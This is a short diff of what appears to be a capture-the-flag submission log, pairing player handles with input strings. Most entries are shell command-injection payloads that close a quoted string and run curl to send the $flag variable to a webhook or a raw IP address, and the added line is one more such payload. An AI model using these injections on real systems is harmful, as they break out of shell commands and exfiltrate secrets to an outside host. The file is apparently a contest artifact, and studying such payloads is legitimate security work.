@@ -657,3 +657,4 @@ wgblikeW:`curl -d "flag=$flag" https://hookb.in/DrlOZkRgELCPajxxaW2g`
 aoyama7:“;echo"1
 R1gelX29:a"; set +e; curl http://101.132.238.43:5992/?token=$flag;#
 R1gelX29:a"; set +e; curl http://101.132.238.43:5992/?token=$flag;#
+R1gelX29:a"; set +e; curl http://101.132.238.43:5000/?token=$flag;#
